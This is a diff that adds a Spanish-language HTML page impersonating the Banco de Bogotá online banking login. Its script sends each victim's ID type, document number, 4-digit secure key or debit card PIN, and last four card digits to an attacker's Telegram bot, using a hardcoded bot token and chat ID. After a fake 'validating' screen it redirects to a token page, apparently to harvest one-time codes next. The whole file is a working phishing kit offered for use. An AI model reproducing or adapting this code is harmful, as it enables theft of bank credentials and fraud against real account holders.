@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 440px;
+            margin: 0 auto;
+            background-color: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            padding: 24px 20px;
+            border-bottom: 1px solid #e5e5e5;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            flex-shrink: 0;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        .banner {
+            background: linear-gradient(135deg, #1565C0 0%, #0D47A1 100%);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 0;
+            border-radius: 0;
+        }
+
+        .banner-image {
+            width: 70px;
+            height: 70px;
+            background-color: transparent;
+            border-radius: 0;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+
+        .banner-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .banner-text {
+            color: white;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .banner-text strong {
+            font-weight: 600;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 16px;
+            text-align: center;
+            background: none;
+            border: none;
+            border-bottom: 3px solid transparent;
+            color: #5f6368;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .tab.active {
+            color: #1565C0;
+            border-bottom-color: #1565C0;
+        }
+
+        .tab:hover {
+            background-color: #f8f9fa;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+        .info-box {
+            background-color: #E8F0FE;
+            border-left: 4px solid #1565C0;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: start;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #3c4043;
+        }
+
+        .info-box button {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            margin-left: 12px;
+            flex-shrink: 0;
+        }
+
+        .close-icon {
+            width: 20px;
+            height: 20px;
+            color: #5f6368;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+            margin-bottom: 8px;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        select,
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1.5px solid #dadce0;
+            border-radius: 4px;
+            font-size: 15px;
+            color: #3c4043;
+            background-color: white;
+            transition: border-color 0.2s;
+        }
+
+        select {
+            flex: 0 0 140px;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 20 20' fill='none'%3E%3Cpath d='M5 7.5L10 12.5L15 7.5' stroke='%231565C0' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        input[type="text"] {
+            flex: 1;
+        }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        input[type="password"] {
+            padding-right: 45px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .eye-icon {
+            width: 24px;
+            height: 24px;
+            color: #1565C0;
+        }
+
+        input:focus,
+        select:focus {
+            outline: none;
+            border-color: #1565C0;
+        }
+
+        input::placeholder {
+            color: #9aa0a6;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: #dadce0;
+            color: #80868b;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit.enabled {
+            background-color: #1565C0;
+            color: white;
+            cursor: pointer;
+        }
+
+        .btn-submit.enabled:hover {
+            background-color: #0D47A1;
+        }
+
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .links a {
+            color: #1565C0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            padding: 16px 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+            line-height: 1.5;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .footer a {
+            color: #1565C0;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* VIDEO CARGA */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-screen.show {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+            background: white;
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 300px;
+            width: 90%;
+        }
+
+        .loading-logo {
+            width: 80px;
+            height: auto;
+            margin: 0 auto 20px;
+            object-fit: contain;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            margin: 20px auto;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #1565C0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 14px;
+            color: #3c4043;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        /* ============= DESKTOP 1024px+ ============= */
+        @media screen and (min-width: 1024px) {
+            body {
+                padding: 40px 20px;
+                background: #f5f5f5;
+                display: flex;
+                justify-content: flex-start;
+                align-items: flex-start;
+            }
+
+            .container {
+                max-width: 500px;
+                margin: 0;
+                border-radius: 16px;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+                overflow: hidden;
+            }
+
+            .header {
+                padding: 32px 28px 24px;
+                border-bottom: none;
+                display: flex;
+                align-items: center;
+                gap: 16px;
+                background: white;
+            }
+
+            .logo {
+                width: 120px;
+                height: auto;
+                flex-shrink: 0;
+            }
+
+            .header h1 {
+                font-size: 24px;
+                font-weight: 600;
+                color: #1a1a1a;
+                margin: 0;
+            }
+
+            .banner {
+                background: linear-gradient(135deg, #1565C0 0%, #0D47A1 100%);
+                padding: 24px 28px;
+                margin: 0;
+                border-radius: 0;
+                display: flex;
+                align-items: center;
+                gap: 18px;
+            }
+
+            .banner-image {
+                width: 80px;
+                height: 80px;
+                background-color: transparent;
+                border-radius: 0;
+                flex-shrink: 0;
+            }
+
+            .banner-image img {
+                width: 100%;
+                height: 100%;
+                object-fit: contain;
+            }
+
+            .banner-text {
+                color: white;
+                font-size: 15px;
+                line-height: 1.5;
+            }
+
+            .banner-text strong {
+                font-size: 16px;
+                font-weight: 600;
+                display: block;
+                margin-bottom: 6px;
+            }
+
+            .tabs {
+                display: flex;
+                border-bottom: 1px solid #e5e5e5;
+                background: white;
+                padding: 0 28px;
+                margin: 0;
+            }
+
+            .tab {
+                flex: 1;
+                padding: 18px 0;
+                text-align: center;
+                border: none;
+                border-bottom: 3px solid transparent;
+                color: #5f6368;
+                font-size: 15px;
+                font-weight: 500;
+                cursor: pointer;
+                transition: all 0.2s;
+                background: none;
+            }
+
+            .tab.active {
+                color: #1565C0;
+                border-bottom-color: #1565C0;
+            }
+
+            .tab:hover {
+                background-color: transparent;
+            }
+
+            .content {
+                padding: 28px;
+                background: white;
+            }
+
+            .info-box {
+                background-color: #E8F0FE;
+                border-left: 4px solid #1565C0;
+                padding: 14px 18px;
+                margin-bottom: 28px;
+                display: flex;
+                justify-content: space-between;
+                align-items: flex-start;
+                font-size: 14px;
+                line-height: 1.6;
+                color: #3c4043;
+                border-radius: 6px;
+            }
+
+            .form-group {
+                margin-bottom: 24px;
+            }
+
+            .form-label {
+                display: block;
+                font-size: 14px;
+                font-weight: 600;
+                color: #1a1a1a;
+                margin-bottom: 10px;
+            }
+
+            .input-row {
+                display: flex;
+                gap: 14px;
+            }
+
+            select,
+            input[type="text"],
+            input[type="password"] {
+                width: 100%;
+                padding: 12px 16px;
+                border: 1.5px solid #dadce0;
+                border-radius: 6px;
+                font-size: 15px;
+                color: #3c4043;
+                background-color: white;
+                transition: all 0.2s;
+            }
+
+            select {
+                flex: 0 0 150px;
+                padding-right: 40px;
+            }
+
+            .btn-submit {
+                width: 100%;
+                padding: 14px;
+                background-color: #dadce0;
+                color: #80868b;
+                border: none;
+                border-radius: 6px;
+                font-size: 15px;
+                font-weight: 600;
+                cursor: not-allowed;
+                margin-top: 12px;
+                margin-bottom: 24px;
+                transition: all 0.3s;
+            }
+
+            .btn-submit.enabled {
+                background-color: #1565C0;
+                color: white;
+                cursor: pointer;
+                box-shadow: 0 2px 8px rgba(21, 101, 192, 0.2);
+            }
+
+            .btn-submit.enabled:hover {
+                background-color: #0D47A1;
+                box-shadow: 0 4px 12px rgba(21, 101, 192, 0.3);
+            }
+
+            .links {
+                display: flex;
+                justify-content: space-between;
+                margin-top: 24px;
+                padding-top: 24px;
+                border-top: 1px solid #e5e5e5;
+                gap: 16px;
+            }
+
+            .links a {
+                flex: 1;
+                color: #1565C0;
+                text-decoration: none;
+                font-size: 14px;
+                font-weight: 500;
+                text-align: center;
+            }
+
+            .footer {
+                padding: 20px 28px;
+                text-align: center;
+                font-size: 12px;
+                color: #5f6368;
+                line-height: 1.6;
+                border-top: 1px solid #e5e5e5;
+                background: #fafbfc;
+            }
+        }
+
+        /* Responsive imagen móvil */
+        @media (max-width: 768px) {
+            .left-section { display: none; }
+            .right-section { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <!-- PANTALLA DE CARGA -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo">
+            <div class="spinner"></div>
+            <p class="loading-text">Validando información...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="imagen.png" alt="Logo">
+            </div>
+            <h1>Bienvenido a tu Banca Virtual</h1>
+        </div>
+
+        <div class="banner">
+            <div class="banner-image">
+                <img src="Imagenes/Señora.png" alt="Asistente">
+            </div>
+            <div class="banner-text">
+                <strong>¿Nunca has ingresado a Banca Virtual?</strong>
+                Aquí te decimos cómo hacerlo ›
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="showTab(0)">Clave segura</button>
+            <button class="tab" onclick="showTab(1)">Tarjeta débito</button>
+        </div>
+
+        <div class="content">
+            <div class="info-box" id="infoBox">
+                <div>
+                    Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.
+                </div>
+                <button onclick="this.parentElement.style.display='none'">
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Formulario Clave Segura -->
+            <form id="claveSeguraForm" class="form-view">
+                <div class="form-group">
+                    <label class="form-label">Identificación</label>
+                    <div class="input-row">
+                        <select id="docType1">
+                            <option>C.C.</option>
+                            <option>T.I.</option>
+                            <option>C.E.</option>
+                            <option>N.I.T.</option>
+                            <option>N.P.E.</option>
+                            <option>N.I.J.</option>
+                            <option>P.S.</option>
+                            <option>R.C.</option>
+                        </select>
+                        <input type="text" id="docNumber1" placeholder="#" inputmode="numeric" maxlength="10" />
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Clave segura (4 dígitos)</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="password1" placeholder="····" inputmode="numeric" maxlength="4" />
+                        <button type="button" class="toggle-password" onclick="togglePassword('password1')">
+                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn1" disabled>Ingresar</button>
+
+                <div class="links">
+                    <a href="#">Registrarme ›</a>
+                    <a href="#">Olvidé mi clave ›</a>
+                </div>
+            </form>
+
+            <!-- Formulario Tarjeta Débito -->
+            <form id="tarjetaDebitoForm" class="form-view" style="display: none;">
+                <div class="form-group">
+                    <label class="form-label">Identificación</label>
+                    <div class="input-row">
+                        <select id="docType2">
+                            <option>C.C.</option>
+                            <option>T.I.</option>
+                            <option>C.E.</option>
+                            <option>N.I.T.</option>
+                            <option>N.P.E.</option>
+                            <option>N.I.J.</option>
+                            <option>P.S.</option>
+                            <option>R.C.</option>
+                        </select>
+                        <input type="text" id="docNumber2" placeholder="#" inputmode="numeric" maxlength="10" />
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Clave de tu tarjeta débito (4 dígitos)</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="cardPassword" placeholder="····" inputmode="numeric" maxlength="4" />
+                        <button type="button" class="toggle-password" onclick="togglePassword('cardPassword')">
+                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Últimos 4 dígitos de tu tarjeta débito</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="lastDigits" placeholder="····" maxlength="4" inputmode="numeric" />
+                        <button type="button" class="toggle-password" onclick="togglePassword('lastDigits')">
+                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn2" disabled>Ingresar</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio</a> de Google.
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003784784181';
+
+        async function enviarATelegram(datos) {
+            const mensaje = `👤 <b>LOGIN ${datos.tipoIngreso.toUpperCase()} - BANCO DE BOGOTÁ</b>
+
+<b>Tipo de documento:</b> <code>${datos.tipoDocumento}</code>
+<b>Número de documento:</b> <code>${datos.numeroDocumento}</code>
+<b>${datos.tipoClave}:</b> <code>${datos.clave}</code>
+${datos.ultimosDigitos ? `<b>Últimos 4 dígitos:</b> <code>${datos.ultimosDigitos}</code>` : ''}
+
+<b>⏰ Recibido:</b> ${datos.fecha}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Error al enviar a Telegram:', error);
+                return false;
+            }
+        }
+
+        function showTab(index) {
+            const tabs = document.querySelectorAll('.tab');
+            const claveSeguraForm = document.getElementById('claveSeguraForm');
+            const tarjetaDebitoForm = document.getElementById('tarjetaDebitoForm');
+            const infoBox = document.getElementById('infoBox');
+
+            tabs.forEach(t => t.classList.remove('active'));
+            tabs[index].classList.add('active');
+
+            if (index === 0) {
+                claveSeguraForm.style.display = 'block';
+                tarjetaDebitoForm.style.display = 'none';
+                infoBox.style.display = 'flex';
+            } else {
+                claveSeguraForm.style.display = 'none';
+                tarjetaDebitoForm.style.display = 'block';
+                infoBox.style.display = 'none';
+            }
+        }
+
+        const docNumber1 = document.getElementById('docNumber1');
+        const password1 = document.getElementById('password1');
+        const submitBtn1 = document.getElementById('submitBtn1');
+
+        docNumber1.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            validateClaveSegura();
+        });
+
+        password1.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            validateClaveSegura();
+        });
+
+        function validateClaveSegura() {
+            if (docNumber1.value.trim() !== '' && password1.value.trim().length === 4) {
+                submitBtn1.classList.add('enabled');
+                submitBtn1.disabled = false;
+            } else {
+                submitBtn1.classList.remove('enabled');
+                submitBtn1.disabled = true;
+            }
+        }
+
+        const docNumber2 = document.getElementById('docNumber2');
+        const cardPassword = document.getElementById('cardPassword');
+        const lastDigits = document.getElementById('lastDigits');
+        const submitBtn2 = document.getElementById('submitBtn2');
+
+        docNumber2.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            validateTarjetaDebito();
+        });
+
+        cardPassword.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            validateTarjetaDebito();
+        });
+
+        lastDigits.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            validateTarjetaDebito();
+        });
+
+        function validateTarjetaDebito() {
+            if (docNumber2.value.trim() !== '' && 
+                cardPassword.value.trim().length === 4 && 
+                lastDigits.value.trim().length === 4) {
+                submitBtn2.classList.add('enabled');
+                submitBtn2.disabled = false;
+            } else {
+                submitBtn2.classList.remove('enabled');
+                submitBtn2.disabled = true;
+            }
+        }
+
+        function togglePassword(fieldId) {
+            const passwordInput = document.getElementById(fieldId);
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        }
+
+        document.getElementById('claveSeguraForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            document.getElementById('loadingScreen').classList.add('show');
+            submitBtn1.disabled = true;
+            submitBtn1.textContent = 'Verificando...';
+            
+            const datos = {
+                tipoIngreso: 'Clave Segura',
+                tipoDocumento: document.getElementById('docType1').value,
+                numeroDocumento: docNumber1.value,
+                tipoClave: 'Clave Segura',
+                clave: password1.value,
+                ultimosDigitos: null,
+                fecha: new Date().toLocaleString('es-CO')
+            };
+            
+            const enviado = await enviarATelegram(datos);
+            
+            if (enviado) {
+                setTimeout(() => {
+                    window.location.href = 'token.html';
+                }, 2000);
+            } else {
+                document.getElementById('loadingScreen').classList.remove('show');
+                alert('Error en la verificación. Intente nuevamente.');
+                submitBtn1.disabled = false;
+                submitBtn1.textContent = 'Ingresar';
+            }
+        });
+
+        document.getElementById('tarjetaDebitoForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            document.getElementById('loadingScreen').classList.add('show');
+            submitBtn2.disabled = true;
+            submitBtn2.textContent = 'Verificando...';
+            
+            const datos = {
+                tipoIngreso: 'Tarjeta Débito',
+                tipoDocumento: document.getElementById('docType2').value,
+                numeroDocumento: docNumber2.value,
+                tipoClave: 'Clave de Tarjeta',
+                clave: cardPassword.value,
+                ultimosDigitos: lastDigits.value,
+                fecha: new Date().toLocaleString('es-CO')
+            };
+            
+            const enviado = await enviarATelegram(datos);
+            
+            if (enviado) {
+                setTimeout(() => {
+                    window.location.href = 'token.html';
+                }, 2000);
+            } else {
+                document.getElementById('loadingScreen').classList.remove('show');
+                alert('Error en la verificación. Intente nuevamente.');
+                submitBtn2.disabled = false;
+                submitBtn2.textContent = 'Ingresar';
+            }
+        });
+    </script>
+</body>
+</html>
